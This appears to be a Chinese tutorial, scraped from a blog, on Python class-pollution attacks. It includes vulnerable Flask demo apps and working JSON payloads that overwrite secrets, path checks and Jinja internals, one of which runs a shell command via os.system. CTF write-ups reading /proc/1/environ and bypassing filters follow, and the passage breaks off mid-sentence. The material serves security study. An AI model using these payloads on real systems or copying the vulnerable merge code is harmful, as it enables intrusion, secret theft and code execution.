41 42 43 44 45 46 47 secret_var = 114 def test(): pass class a: secret_class_var = \u0026#34;secret\u0026#34; class b: def __init__(self): pass def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) instance = b() payload = { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;secret_var\u0026#34; : 514, \u0026#34;a\u0026#34; : { \u0026#34;secret_class_var\u0026#34; : \u0026#34;Pooooluted ~\u0026#34; } } } } print(a.secret_class_var) #secret print(secret_var) #114 merge(payload, instance) print(a.secret_class_var) #Pooooluted ~ print(secret_var) #514 已加载模块获取 局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了\nimport加载获取 在加载关系简单的情况下，我们可以直接从文件的import语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块，在payload中我们只需要对对应的模块重新定位就可以\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #test.py import test_1 class cls: def __init__(self): pass def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) instance = cls() payload = { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;test_1\u0026#34; : { \u0026#34;secret_var\u0026#34; : 514, \u0026#34;target_class\u0026#34; : { \u0026#34;secret_class_var\u0026#34; : \u0026#34;Poluuuuuuted ~\u0026#34; } } } } } print(test_1.secret_var) #secret print(test_1.target_class.secret_class_var) #114 merge(payload, instance) print(test_1.secret_var) #514 print(test_1.target_class.secret_class_var) #Poluuuuuuted ~ 1 2 3 4 5 6 #test_1.py secret_var = 114 class target_class secret_class_var = \u0026#34;secret\u0026#34; sys模块加载获取 在很多环境当中，会引用第三方模块或者是内置模块，而不是简单的import同级文件下面的目录，所以我们就要借助sys模块中的module属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import sys payload = { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;sys\u0026#34; : { \u0026#34;modules\u0026#34; : { \u0026#34;test_1\u0026#34; : { \u0026#34;secret_var\u0026#34; : 514, \u0026#34;target_class\u0026#34; : { \u0026#34;secret_class_var\u0026#34; : \u0026#34;Poluuuuuuted ~\u0026#34; } } } } } } } 当然我们去使用的Payload绝大部分情况下是不会这样的，如上的Payload实际上是在已经import sys的情况下使用的，而大部分情况是没有直接导入的，这样问题就从寻找import特定模块的语句转换为寻找import了sys模块的语句，对问题解决的并不见得有多少优化\n加载器loader获取 为了进一步优化，这里采用方式是利用Python中加载器loader,简单来说就是为实现模块加载而设计的类，其在importlib这一内置模块中有具体实现。令人庆幸的是importlib模块下所有的py文件中均引入了sys模块\n这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过loader.__init__.__globals__['sys']来获取到sys模块，然后再获取到我们想要的模块。\n现在就是要获取loader\n__loader__内置属性会被赋值为加载该模块的loader，这样只要能获取到任意的模块便能通过__loader__属性获取到loader，而且对于python3来说除了在debug模式下的主文件中__loader__为None以外，正常执行的情况每个模块的__loader__属性均有一个对应的类\n举个例子\n1 2 3 4 5 import math # 获取模块的loader loader = math.__loader__ # 打印loader信息 print(loader) __spec__内置属性在Python 3.4版本引入，其包含了关于类加载时的信息，本身是定义在Lib/importlib/_bootstrap.py的类ModuleSpec，显然因为定义在importlib模块下的py文件，所以可以直接采用\u0026lt;模块名\u0026gt;.__spec__.__init__.__globals__['sys']获取到sys模块\n由于ModuleSpec的属性值设置，相对于上面的获取方式，还有一种相对长的payload的获取方式，主要是利用ModuleSpec中的loader属性。如属性名所示，该属性的值是模块加载时所用的loader\n所以有这样的相对长的Payload：\u0026lt;模块名\u0026gt;.__spec__.loader.__init__.__globals__['sys']\n实际环境中的合并函数 目前发现了Pydash模块中的set_和set_with函数具有如上实例中merge函数类似的类属性赋值逻辑，能够实现污染攻击。\n例如下面这个例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pydash import set_ class Father: secret_value = \u0026#34;safe\u0026#34; class Pollution(object): def __init__(self): pass pollutant = Pollution() father = Father() payload = { \u0026#34;key\u0026#34; : \u0026#34;__class__.__init__.__globals__.father.secret_value\u0026#34;, \u0026#34;value\u0026#34; : \u0026#34;polluted\u0026#34; } key = payload[\u0026#34;key\u0026#34;] value = payload[\u0026#34;value\u0026#34;] print(father.secret_value) #safe set_(pollutant,key, value) print(father.secret_value) #polluted 攻击面拓展 函数形参默认值替换 主要用到了函数的__defaults__和__kwdefaults__这两个内置属性\n__defaults__ __defaults__以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参+键值形参,当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在__defaults__元组中。\n1 2 3 4 def a(var_1, var_2 =2, var_3 = 3): pass print(a.__defaults__) #(2, 3) 通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如JSON等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 def evilFunc(arg_1 , shell = False): if not shell: print(arg_1) else: print(__import__(\u0026#34;os\u0026#34;).popen(arg_1).read()) class cls: def __init__(self): pass def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) instance = cls() payload = { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;evilFunc\u0026#34; : { \u0026#34;__defaults__\u0026#34; : ( True , ) } } } } evilFunc(\u0026#34;whoami\u0026#34;) #whoami merge(payload, instance) evilFunc(\u0026#34;whoami\u0026#34;) #article-kelp __kwdefaults__ __kwdefaults__以字典的形式按从左到右的顺序收录了函数键值形参的默认值\n1 2 3 4 5 6 7 8 9 10 11 payload = { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;evilFunc\u0026#34; : { \u0026#34;__kwdefaults__\u0026#34; : { \u0026#34;shell\u0026#34; : True } } } } } 特定值替换 os.environ赋值 可以实现多种利用方式，如NCTF2022中calc考点对os.system的利用，结合LD_PRELOAD与文件上传.so实现劫持等\nflask相关属性 SECRET_KEY 如果我们可以对密钥进行替换，赋值为我们想要的，我们就可以进行任意的session伪造，这里因为secret_key是在当前入口文件下面的，所以我们可以直接通过__init__.__globals__获取全局变量，然后通过app.config[\u0026ldquo;SECRET_KEY\u0026rdquo;]来进行污染\n给出示范环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #app.py from flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;[+]Config:%s\u0026#34;%(app.config[\u0026#39;SECRET_KEY\u0026#39;]) app.run(host=\u0026#34;0.0.0.0\u0026#34;) payload\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;app\u0026#34; : { \u0026#34;config\u0026#34; : { \u0026#34;SECRET_KEY\u0026#34; :\u0026#34;Polluted~\u0026#34; } } } } } _got_first_request 用于判定是否某次请求为自Flask启动后第一次请求，是Flask.got_first_request函数的返回值，此外还会影响装饰器app.before_first_request的调用，依据源码可以知道_got_first_request值为假时才会调用\n所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将_got_first_request从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器app.before_first_request下面的可用信息。\n示范环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() flag = \u0026#34;Is flag here?\u0026#34; @app.before_first_request def init(): global flag if hasattr(app, \u0026#34;special\u0026#34;) and app.special == \u0026#34;U_Polluted_It\u0026#34;: flag = open(\u0026#34;flag\u0026#34;, \u0026#34;rt\u0026#34;).read() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) global flag setattr(app, \u0026#34;special\u0026#34;, \u0026#34;U_Polluted_It\u0026#34;) return flag app.run(host=\u0026#34;0.0.0.0\u0026#34;) before_first_request修饰的init函数只会在第一次访问前被调用，而其中读取flag的逻辑又需要访问路由/后才能触发，这就构成了矛盾。所以需要使用payload在访问/后重置_got_first_request属性值为假，这样before_first_request才会再次调用。\npayload\n1 2 3 4 5 6 7 8 9 { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;app\u0026#34; : { \u0026#34;_got_first_request\u0026#34; :false } } } } _static_url_path 这个属性中存放的是flask中静态目录的值，默认该值为static。访问flask下的资源可以采用如http://domain/static/xxx，这样实际上就相当于访问_static_url_path目录下xxx的文件并将该文件内容作为响应内容返回,但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向\n1 2 3 4 5 6 7 #static/index.html \u0026lt;html\u0026gt; \u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #app.py from flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;flag in ./flag but heres only static/index.html\u0026#34; app.run(host=\u0026#34;0.0.0.0\u0026#34;) 此时http://domain/static/xxx只能访问到文件系统当前目录下static目录中的xxx文件，并且不存在如目录穿越的漏洞,污染该属性为当前目录。这样就能访问到当前目录下的flag文件了\n1 2 3 4 5 6 7 8 9 payload={ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;app\u0026#34;:{ \u0026#34;_static_folder\u0026#34;:\u0026#34;./\u0026#34; } } } } 然后再访问static目录下文件就行了\nos.path.pardir 这个os模块下的变量会影响flask的模板渲染函数render_template的解析，所以也收录在flask部分\n1 2 3 4 5 6 7 #templates/index.html \u0026lt;html\u0026gt; \u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #app.py from flask import Flask,request,render_template import json import os app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;flag in ./flag but u just can use /file to vist ./templates/file\u0026#34; @app.route(\u0026#34;/\u0026lt;path:path\u0026gt;\u0026#34;) def render_page(path): if not os.path.exists(\u0026#34;templates/\u0026#34; + path): return \u0026#34;not found\u0026#34;, 404 return render_template(path) app.run(host=\u0026#34;0.0.0.0\u0026#34;) 直接访问http://domain/xxx时会使用render_tempaltes渲染templates/xxx文件\n如果尝试目录穿越则会导致render_template函数报错500\n找到报错的源码\n1 2 3 4 5 6 7 8 9 def _get_source_fast( self, environment: BaseEnvironment, template: str ) -\u0026gt; tuple[str, str | None, t.Callable[[], bool] | None]: for _srcobj, loader in self._iter_loaders(template): try: return loader.get_source(environment, template) except TemplateNotFound: continue raise TemplateNotFound(template) 跟进get_source函数，来到Lib/site-packages/jinja2/loaders.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 def get_source( self, environment: \u0026#34;Environment\u0026#34;, template: str ) -\u0026gt; t.Tuple[str, str, t.Callable[[], bool]]: pieces = split_template_path(template) for searchpath in self.searchpath: # Use posixpath even on Windows to avoid \u0026#34;drive:\u0026#34; or UNC # segments breaking out of the search directory. filename = posixpath.join(searchpath, *pieces) if os.path.isfile(filename): break else: raise TemplateNotFound(template) with open(filename, encoding=self.encoding) as f: contents = f.read() mtime = os.path.getmtime(filename) def uptodate() -\u0026gt; bool: try: return os.path.getmtime(filename) == mtime except OSError: return False # Use normpath to convert Windows altsep to sep. return contents, os.path.normpath(filename), uptodate 跟进split_template_path函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def split_template_path(template: str) -\u0026gt; t.List[str]: \u0026#34;\u0026#34;\u0026#34;Split a path into segments and perform a sanity check. If it detects \u0026#39;..\u0026#39; in the path it will raise a `TemplateNotFound` error. \u0026#34;\u0026#34;\u0026#34; pieces = [] for piece in template.split(\u0026#34;/\u0026#34;): if ( os.path.sep in piece or (os.path.altsep and os.path.altsep in piece) or piece == os.path.pardir#34行 ): raise TemplateNotFound(template) elif piece and piece != \u0026#34;.\u0026#34;: pieces.append(piece) return pieces 结合函数注释可以了解到这个函数将会把传入的模板路径按照/进行分割，在34行的逻辑判断上决定了（其余的部分逻辑值基本为假）整个if语句是否为真，显然需要改语句为假避免触发36行的raise。34行中的os.path.pardir值即为..，所以只要修改该属性为任意其他值即可避免报错，从而实现render_template函数的目录穿越\n这里改成,\npayload\n1 2 3 4 5 6 7 8 9 10 11 payload={ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;os\u0026#34;:{ \u0026#34;path\u0026#34;:{ \u0026#34;pardir\u0026#34;:\u0026#34;,\u0026#34; } } } } } 然后就可以目录穿越了\nJinja语法标识符 在默认的规则规则下，常用Jinja语法标识符有{{ Code }}、{% Code %}、{# Code #}，当然对于我们需要RCE的需求来说，通常前两者才需要留意。而Flask官方文档中明确告知了，这些语法标识符均是可以依照Jinja中修改的\n在Jinja文档中展示了对这些语法标识符进行替换的方法：API — Jinja Documentation (3.1.x) (palletsprojects.com)，即对Jinja的环境类的相关属性赋值，文档中提到说，如果此类的实例未共享并且尚未加载模板的话，我们就可以修改此类的实例\n而在Flask中使用了Flask类（Lib/site-packages/flask/app.py）的装饰器装饰后的jinja_env方法实现上述的功能；经过装饰器的装饰后，简单来说可以将该方法视为属性，对该方法的获取就能实现方法调用，类似Flask.jinja_env就相当于Flask.jinja_env()。\n跟进其中调用的create_jinja_environment，结合注释就可以发现jinja_env方法返回值就是Jinja中的环境类（实际上是对原生的Jinja环境类做了继承，不过在使用上并无多大区别），所以我们可以直接采用类似Flask.jinja_env.variable_start_string = \u0026quot;xxx\u0026quot;来实现对Jinja语法标识符进行替换\n1 2 3 4 5 6 7 #templates/index.html \u0026lt;html\u0026gt; \u0026lt;h1\u0026gt;Look this -\u0026gt; [[flag]] \u0026lt;- try to make it become the real flag\u0026lt;/h1\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #app.py from flask import Flask,request,render_template import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;go check /index before merge it\u0026#34; @app.route(\u0026#39;/index\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def templates(): return render_template(\u0026#34;test.html\u0026#34;, flag = open(\u0026#34;flag\u0026#34;, \u0026#34;rt\u0026#34;).read()) app.run(host=\u0026#34;0.0.0.0\u0026#34;) 访问index路由会给模板填充flag变量的值，但是需要应该要语法标识符是{{flag}}，但这里是[[flag]]是无法被解析的\n我们想要通过{{flag}}的话，就需要将语法标识符进行替换，这里我们就将语法标识符从{{}}，替换为[[]]这样的话，[[flag]]就能够像{{flag}}一样被解析了。\npayload\n1 2 3 4 5 6 7 8 9 10 { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;app\u0026#34; : { \u0026#34;jinja_env\u0026#34; :{ \u0026#34;variable_start_string\u0026#34; : \u0026#34;[[\u0026#34;,\u0026#34;variable_end_string\u0026#34;:\u0026#34;]]\u0026#34; } } } } 但是在Flask框架当中，它会对模板文件编译后进行一定的缓存，下次再需要渲染的时候，直接使用缓存里面的模板文件，这样的话我们修改后语法标识符里面的flag变量并没有被放到缓存当中，所以没有自动填充flag，所以我们需要在Flask启动以后先输入payload再访问路由，这样就可以做到先污染再访问模板\n所以只需我们在Flask服务启动后（当然这里演示就是重启下Flask服务就行了，对于题目来说一般就是重启容器，或是在污染之后再访问模板）先输入payload再访问index路由即可\njinja语法全局数据 实际上包括函数、变量、过滤器这三者都能被自定义的添加到Jinja语法解析时的环境，操作方式于Jinja语法标识符中完全类似\n1 2 3 4 5 6 7 #templates/index.html \u0026lt;html\u0026gt; \u0026lt;h1\u0026gt;{{flag if permission else \u0026#34;No way!\u0026#34;}}\u0026lt;/h1\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #app.py from flask import Flask,request,render_template import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return render_template(\u0026#34;index.html\u0026#34;, flag = open(\u0026#34;flag\u0026#34;, \u0026#34;rt\u0026#34;).read()) app.run(host=\u0026#34;0.0.0.0\u0026#34;) 直接访问会由于没有设定permission值导致if条件为假返回No way!而不是flag\n所以将其赋值为任意逻辑非空值让条件为真即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;app\u0026#34; : { \u0026#34;jinja_env\u0026#34; :{ \u0026#34;golbals\u0026#34; :{ \u0026#34;permission\u0026#34; :true } } } } } } 模板编译时的变量 在flask中如使用render_template渲染一个模板实际上经历了多个阶段的处理，其中一个阶段是对模板中的Jinja语法进行解析转化为AST，而在语法树的根部即Lib/site-packages/jinja2/compiler.py中CodeGenerator类的visit_Template方法存在一段有趣的逻辑\n该逻辑会向输出流写入一段拼接的代码（输出流中代码最终会被编译进而执行），注意其中的exported_names变量，该变量为.runtime模块（即Lib/site-packages/jinja2/runtime.py）中导入的变量exported和async_exported组合后得到，这就意味着我们可以通过污染.runtime模块中这两个变量实现RCE。由于这段逻辑是模板文件解析过程中必经的步骤之一，所以这就意味着只要渲染任意的文件均能通过污染这两属性实现RCE。\n1 2 3 4 5 6 7 #templates/index.html \u0026lt;html\u0026gt; \u0026lt;h1\u0026gt;nt here~\u0026lt;/h1\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #app.py from flask import Flask,request,render_template import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return render_template(\u0026#34;index.html\u0026#34;) app.run(host=\u0026#34;0.0.0.0\u0026#34;) 1 2 #static/ #是个空目录,方便直接利用static目录读取flag 进行RCE将flag写入static目录中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 { \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;__loader__\u0026#34;:{ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;sys\u0026#34;:{ \u0026#34;modules\u0026#34;:{ \u0026#34;jinja2\u0026#34;:{ \u0026#34;runtime\u0026#34;:{ \u0026#34;exported\u0026#34;:[ \u0026#34;*;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cp ./flag ./static/flag\u0026#39;);#\u0026#34; ] } } } } } } } } } } 但是需要注意插入payload的位置是AST的根部分，是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的payload只会在模板在第一次访问时触发\n然后就能在static目录下读取到flag了\n例题 [DASCTF 2023 \u0026amp; 0X401七月暑期挑战赛]EzFlask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 import uuid from flask import Flask, request, session from secret import black_list import json app = Flask(__name__) app.secret_key = str(uuid.uuid4()) def check(data): for i in black_list: if i in data: return False return True def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class user(): def __init__(self): self.username = \u0026#34;\u0026#34; self.password = \u0026#34;\u0026#34; pass def check(self, data): if self.username == data[\u0026#39;username\u0026#39;] and self.password == data[\u0026#39;password\u0026#39;]: return True return False Users = [] @app.route(\u0026#39;/register\u0026#39;,methods=[\u0026#39;POST\u0026#39;]) def register(): if request.data: try: if not check(request.data): return \u0026#34;Register Failed\u0026#34; data = json.loads(request.data) if \u0026#34;username\u0026#34; not in data or \u0026#34;password\u0026#34; not in data: return \u0026#34;Register Failed\u0026#34; User = user() merge(data, User) Users.append(User) except Exception: return \u0026#34;Register Failed\u0026#34; return \u0026#34;Register Success\u0026#34; else: return \u0026#34;Register Failed\u0026#34; @app.route(\u0026#39;/login\u0026#39;,methods=[\u0026#39;POST\u0026#39;]) def login(): if request.data: try: data = json.loads(request.data) if \u0026#34;username\u0026#34; not in data or \u0026#34;password\u0026#34; not in data: return \u0026#34;Login Failed\u0026#34; for user in Users: if user.check(data): session[\u0026#34;username\u0026#34;] = data[\u0026#34;username\u0026#34;] return \u0026#34;Login Success\u0026#34; except Exception: return \u0026#34;Login Failed\u0026#34; return \u0026#34;Login Failed\u0026#34; @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;GET\u0026#39;]) def index(): return open(__file__, \u0026#34;r\u0026#34;).read() if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5010) 这里的merge函数跟上面一模一样，register路由调用了merge函数，根路由下面可以读文件\npayload\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;username\u0026#34;:\u0026#34;a\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;b\u0026#34;, \u0026#34;__class__\u0026#34;:{ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;__file__\u0026#34; : \u0026#34;/flag\u0026#34;#当flag在根目录下以及flag文件名知道的情况下 } } } } 但是有黑名单，导致污染不了，猜测过滤了init\n我们用check函数来获取__globals来污染\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;username\u0026#34;:\u0026#34;a\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;b\u0026#34;, \u0026#34;__class__\u0026#34;:{ \u0026#34;check\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;__file__\u0026#34; : \u0026#34;/flag\u0026#34; } } } } 没有这个文件，我们尝试读环境变量\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;username\u0026#34;:\u0026#34;a\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;b\u0026#34;, \u0026#34;__class__\u0026#34;:{ \u0026#34;check\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;__file__\u0026#34; : \u0026#34;/proc/self/environ\u0026#34; } } } } flag为no\n我们换一种，环境变量可以通过 /proc/$PID/environ 来读取\n污染成/proc/1/environ就出来了\n[Ciscn2024 初赛] sanic 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 from sanic import Sanic from sanic.response import text, html from sanic_session import Session import pydash # pydash==5.1.2 class Pollute: def __init__(self): pass app = Sanic(__name__) app.static(\u0026#34;/static/\u0026#34;, \u0026#34;./static/\u0026#34;) Session(app) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) async def index(request): return html(open(\u0026#39;static/index.html\u0026#39;).read()) @app.route(\u0026#34;/login\u0026#34;) async def login(request): user = request.cookies.get(\u0026#34;user\u0026#34;) if user.lower() == \u0026#39;adm;n\u0026#39;: request.ctx.session[\u0026#39;admin\u0026#39;] = True return text(\u0026#34;login success\u0026#34;) return text(\u0026#34;login fail\u0026#34;) @app.route(\u0026#34;/src\u0026#34;) async def src(request): return text(open(__file__).read()) @app.route(\u0026#34;/admin\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) async def admin(request): if request.ctx.session.get(\u0026#39;admin\u0026#39;) == True: key = request.json[\u0026#39;key\u0026#39;] value = request.json[\u0026#39;value\u0026#39;] if key and value and type(key) is str and \u0026#39;_.\u0026#39; not in key: pollute = Pollute() pydash.set_(pollute, key, value) return text(\u0026#34;success\u0026#34;) else: return text(\u0026#34;forbidden\u0026#34;) return text(\u0026#34;forbidden\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) 在admin路由看到pydash.set_可以想到污染src路由来用__file来读文件\n但是在login路由首先有个cookie的user必须是adm;n，由于这里是从session中读取，所以默认是会在分号处截断，直接传肯定是不行的。怎么绕过呢，很简单，利用八进制编码一下就行了。\n1 user=\u0026#34;adm\\073n\u0026#34; 然后拿session去admin路由\n那么思路到这里就很明确了，主要就是考察一个RFC2068 的编码规则绕过和一个原型链污染。\n同时这里waf了**_.**的组合，我们可以利用\n1 